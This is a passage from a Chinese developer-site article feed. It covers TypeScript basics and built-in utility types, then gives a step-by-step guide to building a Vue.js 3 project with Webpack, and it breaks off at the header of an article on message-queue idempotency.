<li><strong>类型安全：</strong> 在编译阶段发现错误，而不是运行时。</li>
<li><strong>更好的代码提示：</strong> IDE 可以根据类型提供精准的自动补全。</li>
<li><strong>代码可维护性：</strong> 接口即文档，让大型项目结构更清晰。</li>
</ul>
<h3 data-id="heading-3">1.2 核心基础概念</h3>
<h4 data-id="heading-4">接口</h4>
<p>定义对象的结构，充当数据的“契约”。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  email?: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// 可选属性</span>
}
<span class="hljs-keyword">const</span> <span class="hljs-attr">u</span>: <span class="hljs-title class_">User</span> = { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">"Alice"</span> };
</code></pre>
<h4 data-id="heading-5">类</h4>
<p>面向对象编程的基础，Angular 的组件本质上就是一个类。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> {
  <span class="hljs-attr">brand</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">brand: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  }
  <span class="hljs-title function_">drive</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> is driving`</span>);
  }
}
</code></pre>
<h4 data-id="heading-6">装饰器</h4>
<p>一种特殊的语法，用 <code>@</code> 符号标记，用于修改类或属性的行为。Angular 大量使用装饰器（如 <code>@Component</code>, <code>@Injectable</code>）。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Component</span>({
  <span class="hljs-attr">selector</span>: <span class="hljs-string">'app-root'</span>,
  <span class="hljs-attr">template</span>: <span class="hljs-string">'Hello World'</span>
})
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppComponent</span> {}
</code></pre>
<h4 data-id="heading-7">泛型</h4>
<p>将类型参数化，提高代码复用性。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-keyword">return</span> arg;
}
<span class="hljs-comment">// 使用时指定类型</span>
identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"Hello"</span>);
</code></pre>
<h4 data-id="heading-8">访问修饰符</h4>
<p>控制类成员的访问权限：</p>
<ul>
<li><code>public</code>: 公开，默认值。</li>
<li><code>private</code>: 私有，仅类内部可见。</li>
<li><code>protected</code>: 受保护，仅类及其子类可见。</li>
</ul>
<hr/>
<h2 data-id="heading-9">2. 核心内置工具类型解析</h2>
<p>TypeScript 提供了一系列全局工具类型，用于操作和转换类型。理解它们的源码对于进阶至关重要。</p>
<h3 data-id="heading-10">2.1 Partial - 可选化</h3>
<p><strong>作用：</strong> 将类型 <code>T</code> 的所有属性变为可选。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Partial</span>&lt;T&gt; = {
  [P <span class="hljs-keyword">in</span> keyof T]?: T[P];
};
</code></pre>
<ul>
<li><strong>解析：</strong> 遍历 <code>T</code> 的所有属性 <code>P</code>，加上 <code>?</code> 修饰符。</li>
</ul>
<h3 data-id="heading-11">2.2 Required - 必选化</h3>
<p><strong>作用：</strong> 将类型 <code>T</code> 的所有属性变为必选（与 <code>Partial</code> 相反）。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Required</span>&lt;T&gt; = {
    [P <span class="hljs-keyword">in</span> keyof T]-?: T[P];
};
</code></pre>
<ul>
<li><strong>解析：</strong> 这里的 <code>-?</code> 是核心，意为“移除可选修饰符”。</li>
</ul>
<h3 data-id="heading-12">2.3 Pick - 挑选属性</h3>
<p><strong>作用：</strong> 从 <code>T</code> 中挑选一组属性 <code>K</code>，构成新类型。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Pick</span>&lt;T, K <span class="hljs-keyword">extends</span> keyof T&gt; = {
    [P <span class="hljs-keyword">in</span> K]: T[P];
};
</code></pre>
<ul>
<li><strong>解析：</strong>
<ul>
<li><code>K extends keyof T</code>: 约束 <code>K</code> 必须是 <code>T</code> 的属性名。</li>
<li><code>[P in K]</code>: 遍历挑选出的属性。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-13">2.4 Record - 构建对象类型</h3>
<p><strong>作用：</strong> 构建一个对象类型，键名为 <code>K</code>，键值类型为 <code>T</code>。常用于定义字典。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Record</span>&lt;K <span class="hljs-keyword">extends</span> keyof <span class="hljs-built_in">any</span>, T&gt; = {
    [P <span class="hljs-keyword">in</span> K]: T;
};
</code></pre>
<ul>
<li><strong>解析：</strong>
<ul>
<li><code>keyof any</code>: 等价于 <code>string | number | symbol</code>，限制键名类型。</li>
<li>所有属性的值都被统一设为 <code>T</code>。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-14">2.5 Exclude - 排除联合类型成员</h3>
<p><strong>作用：</strong> 从联合类型 <code>T</code> 中排除 <code>U</code>。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Exclude</span>&lt;T, U&gt; = T <span class="hljs-keyword">extends</span> U ? <span class="hljs-built_in">never</span> : T;
</code></pre>
<ul>
<li><strong>解析：</strong> 利用<strong>分布式条件类型</strong>。
<ul>
<li>如果 <code>T</code> 中的成员属于 <code>U</code>，返回 <code>never</code>（在联合类型中会被丢弃）。</li>
<li>如果不属于，保留原类型。</li>
</ul>
</li>
</ul>
<h3 data-id="heading-15">2.6 ReturnType - 获取函数返回值类型</h3>
<p><strong>作用：</strong> 获取函数 <code>T</code> 的返回值类型。
<strong>源码实现：</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">ReturnType</span>&lt;T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; <span class="hljs-built_in">any</span>&gt; = T <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>) =&gt; infer R ? R : <span class="hljs-built_in">any</span>;
</code></pre>
<ul>
<li><strong>解析：</strong>
<ul>
<li><code>infer R</code>: 推断关键字，表示捕获函数返回位置的类型，并赋值给 <code>R</code>。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-16">3. 高级特性</h2>
<h3 data-id="heading-17">3.1 类型断言</h3>
<p>手动指定值的类型，绕过编译器的检查。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"input"</span>) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLInputElement</span>;
</code></pre>
<h3 data-id="heading-18">3.2 类型守卫</h3>
<p>在运行时确保类型的安全。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> value === <span class="hljs-string">"string"</span>) {
  <span class="hljs-comment">// 这里 TS 知道 value 是 string</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(value.<span class="hljs-title function_">toUpperCase</span>());
}
</code></pre>
<h3 data-id="heading-19">3.3 联合类型与交叉类型</h3>
<ul>
<li><code>A | B</code>: 表示 A 或 B（“或”逻辑）。</li>
<li><code>A &amp; B</code>: 表示同时具备 A 和 B 的属性（“且”逻辑）。</li>
</ul>
<hr/>
<h2 data-id="heading-20">4. 前端面试 TypeScript 重点</h2>
<p>在面试中，除了基础语法，建议重点准备以下内容：</p>
<h3 data-id="heading-21">4.1 <code>interface</code> vs <code>type</code></h3>
<ul>
<li><strong>Interface:</strong> 只能定义对象，支持继承 (<code>extends</code>) 和同名自动合并。</li>
<li><strong>Type:</strong> 更灵活，支持定义联合类型、元组等，不支持合并，但可以使用交叉类型。</li>
</ul>
<h3 data-id="heading-22">4.2 <code>any</code> vs <code>unknown</code></h3>
<ul>
<li><code>any</code>: 任意类型，关闭类型检查（不推荐滥用）。</li>
<li><code>unknown</code>: 类型安全的任意类型，使用前必须进行类型收窄。</li>
</ul>
<h3 data-id="heading-23">4.3 <code>readonly</code> vs <code>const</code></h3>
<ul>
<li><code>const</code>: 用于变量，防止变量重新赋值。</li>
<li><code>readonly</code>: 用于属性，防止属性被修改（可以配合接口使用）。</li>
</ul>
<h3 data-id="heading-24">4.4 泛型约束</h3>
<p>如何限制泛型的范围：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}
<span class="hljs-keyword">function</span> loggingIdentity&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arg.<span class="hljs-property">length</span>); <span class="hljs-comment">// 现在可以放心使用 .length 了</span>
  <span class="hljs-keyword">return</span> arg;
}
</code></pre>
<h3 data-id="heading-25">4.5 <code>keyof</code> 与 映射类型</h3>
<ul>
<li><code>keyof</code>: 获取类型的所有键，返回联合类型。</li>
<li>映射类型 (<code>[P in keyof T]</code>): 类似 JS 的 <code>for...in</code>，用于遍历和生成新类型。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue.js 3 项目构建神器：Webpack 全攻略]]></title>    <link>https://juejin.cn/post/7595021656427511835</link>    <guid>https://juejin.cn/post/7595021656427511835</guid>    <pubDate>2026-01-14T08:24:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656427511835" data-draft-id="7595028805157765130" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue.js 3 项目构建神器：Webpack 全攻略"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-14T08:24:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="全栈王校长"/> <meta itemprop="url" content="https://juejin.cn/user/2295436010076631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue.js 3 项目构建神器：Webpack 全攻略
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2295436010076631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    全栈王校长
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:24:21.000Z" title="Wed Jan 14 2026 08:24:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是全栈王校长。</p>
<p>看到这个标题，很多朋友可能会纳闷：现在不是都用 Vite 吗，为什么还要学 Webpack？原因很简单：在大型企业级项目中，稳定性和成熟度才是最重要的考量因素。Webpack 自2013年问世以来，经过了多年的发展和实践检验，生态体系非常完善，几乎任何构建问题都能找到现成的解决方案。而 Vite 虽然轻快，但毕竟2020年才正式发布，生态积淀相对较少。</p>
<p>因此，今天我们就来聊聊如何用 Webpack 构建 Vue.js 3 应用。首先，我们得搞清楚 Webpack 和 Vite 的本质差异，这样才能选对工具。</p>
<h2 data-id="heading-0">Webpack vs Vite：本质差异在哪？</h2>
<p>我一直认为，评判技术的好坏必须结合它的设计初衷。Webpack 和 Vite 的根本区别在于它们的设计理念完全不同。</p>
<p>Vite 定位为现代 Web 开发工具链，它集成了多种构建功能，开发者可以开箱即用。它利用浏览器原生 ES 模块支持，在开发阶段实现快速热更新。</p>
<p>相比之下，Webpack 专注于构建打包本身，它更像是一个构建平台，需要开发者手动配置各种插件和加载器才能实现完整的构建流程。虽然配置复杂，但它提供了更大的灵活性和控制力。</p>
<p>那么，两者的技术能力或者功能有什么异同点呢？</p>
<p>这两种工具在功能上有不少相似之处，都是用来处理前端代码的打包工作。不过它们的实现方式不同：Vite 提供了更多开箱即用的功能，减少了配置工作；而 Webpack 则更灵活，但也需要更多的手动配置。</p>
<p>在实际的企业项目中，稳定可靠比便捷更重要。虽然 Webpack 需要多花些时间配置，但一旦设置好了，后续开发就很稳定。</p>
<p>下面，我们来一步步搭建一个基于 Webpack 的 Vue.js 3 项目。</p>
<h2 data-id="heading-1">Webpack + Vue.js 3 项目搭建全流程</h2>
<p>搭建项目的基本流程包括以下几个环节：</p>
<ol>
<li>准备项目结构和基础代码；</li>
<li>安装必要的依赖包；</li>
<li>设置 Webpack 对 Vue.js 3 的编译选项；</li>
<li>运行编译命令。</li>
</ol>
<p><strong>第一步：规划项目结构</strong>，标准布局如下：</p>
<pre><code class="hljs language-lua" lang="lua">.
├── dist/*
├── <span class="hljs-built_in">package</span>.json
├── src
│   ├── app.vue
│   └── index.js
└── webpack.<span class="hljs-built_in">config</span>.js
</code></pre>
<p>各文件夹及文件的作用说明：</p>
<ul>
<li>dist：存放编译后的成品文件，包括 JS、CSS、HTML 等浏览器可直接运行的静态资源；</li>
<li>package.json：项目配置文件，记录了项目依赖、版本号及脚本命令等信息；</li>
<li>src：源代码存放目录，所有开发工作都在此目录下进行；</li>
<li>webpack.config.js：Webpack 配置文件，定义了如何处理和打包我们的代码。</li>
</ul>
<p>接着我们在 src 目录下创建两个核心文件。首先是组件文件 src/app.vue，代码如下：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"text"</span>&gt;</span>Count: {{state.count}}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"btn"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"onClick"</span>&gt;</span>Add<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">reactive</span>({
    <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>
  });
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">onClick</span> = (<span class="hljs-params"/>) =&gt; {
    state.<span class="hljs-property">count</span> ++;
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.demo</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0px</span> <span class="hljs-number">0px</span> <span class="hljs-number">9px</span> <span class="hljs-number">#00000066</span>;
  <span class="hljs-attribute">text-align</span>: center;
}
<span class="hljs-selector-class">.demo</span> <span class="hljs-selector-class">.text</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;
  <span class="hljs-attribute">font-weight</span>: bolder;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666666</span>;
}
<span class="hljs-selector-class">.demo</span> <span class="hljs-selector-class">.btn</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">10px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">32px</span>;
  <span class="hljs-attribute">min-width</span>: <span class="hljs-number">80px</span>;
  <span class="hljs-attribute">cursor</span>: pointer;
} 
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>然后是入口文件 src/index.js，内容如下：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./app.vue'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>);
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<p>完成第一步后，<strong>进入第二步：安装项目所需的各种依赖包</strong>。</p>
<p>依赖包分为两类：一类是项目运行时必需的（runtime dependencies），另一类是开发时使用的工具（dev dependencies）。安装时需要用不同的命令参数加以区分。</p>
<p>首先安装运行时依赖（即项目实际需要的库）：</p>
<pre><code class="hljs language-shell" lang="shell">npm i --save vue
</code></pre>
<p>这条命令会把 Vue.js 添加到 package.json 的 dependencies 部分，表示这是项目运行所必需的库。</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"dependencies"</span>: {
    <span class="hljs-string">"vue"</span>: <span class="hljs-string">"^3.2.37"</span>
  }
}
</code></pre>
<p>接下来安装开发时所需的工具包：</p>
<pre><code class="hljs language-shell" lang="shell">npm i --save-dev css-loader mini-css-extract-plugin vue-loader webpack webpack-cli
</code></pre>
<p>这些工具仅在开发和构建阶段使用，不会出现在最终产品中。它们会被添加到 package.json 的 devDependencies 部分。</p>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-string">"devDependencies"</span>: {
    <span class="hljs-string">"css-loader"</span>: <span class="hljs-string">"^6.7.1"</span>,
    <span class="hljs-string">"mini-css-extract-plugin"</span>: <span class="hljs-string">"^2.6.1"</span>,
    <span class="hljs-string">"vue-loader"</span>: <span class="hljs-string">"^17.0.0"</span>,
    <span class="hljs-string">"webpack"</span>: <span class="hljs-string">"^5.74.0"</span>,
    <span class="hljs-string">"webpack-cli"</span>: <span class="hljs-string">"^4.10.0"</span>
  }
}
</code></pre>
<p><strong>第三步：编写 Webpack 配置文件</strong></p>
<p>下面是完整的 webpack.config.js 配置代码，请先看一遍整体结构：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">VueLoaderPlugin</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'vue-loader'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">entry</span>: <span class="hljs-string">'./src/index.js'</span>,
  <span class="hljs-attr">output</span>: {
    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'dist'</span>),
    <span class="hljs-attr">filename</span>: <span class="hljs-string">'bundle.js'</span>
  },
  <span class="hljs-attr">module</span>: {
    <span class="hljs-attr">rules</span>: [
      {
        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.vue$/</span>,
        <span class="hljs-attr">loader</span>: <span class="hljs-string">'vue-loader'</span>
      },
      {
        <span class="hljs-attr">test</span>: <span class="hljs-regexp">/\.css$/</span>,
        <span class="hljs-attr">use</span>: [
          <span class="hljs-title class_">MiniCssExtractPlugin</span>.<span class="hljs-property">loader</span>,
          <span class="hljs-string">'css-loader'</span>
        ]
      }
    ]
  },
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">VueLoaderPlugin</span>(),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">MiniCssExtractPlugin</span>({
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'style.css'</span>
    })
  ]
};
</code></pre>
<p>这份配置告诉 Webpack 如何处理我们的 Vue.js 3 代码，包括 JS、CSS 和 Vue 单文件组件，最终生成浏览器可以直接运行的文件。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MQ消息幂等性实战：MQ 负责“不丢”，你负责“不重” —— 基于新增与修改场景的深度拆解]]></title>    <link>https://juejin.cn/post/7594801581004374052</link>    <guid>https://juejin.cn/post/7594801581004374052</guid>    <pubDate>2026-01-14T08:41:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594801581004374052" data-draft-id="7594801581004324900" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MQ消息幂等性实战：MQ 负责“不丢”，你负责“不重” —— 基于新增与修改场景的深度拆解"/> <meta itemprop="keywords" content="消息队列"/> <meta itemprop="datePublished" content="2026-01-14T08:41:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="理性的沸羊羊"/> <meta itemprop="url" content="https://juejin.cn/user/2922918847448590"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MQ消息幂等性实战：MQ 负责“不丢”，你负责“不重” —— 基于新增与修改场景的深度拆解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2922918847448590/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    理性的沸羊羊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T08:41:42.000Z" title="Wed Jan 14 2026 08:41:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
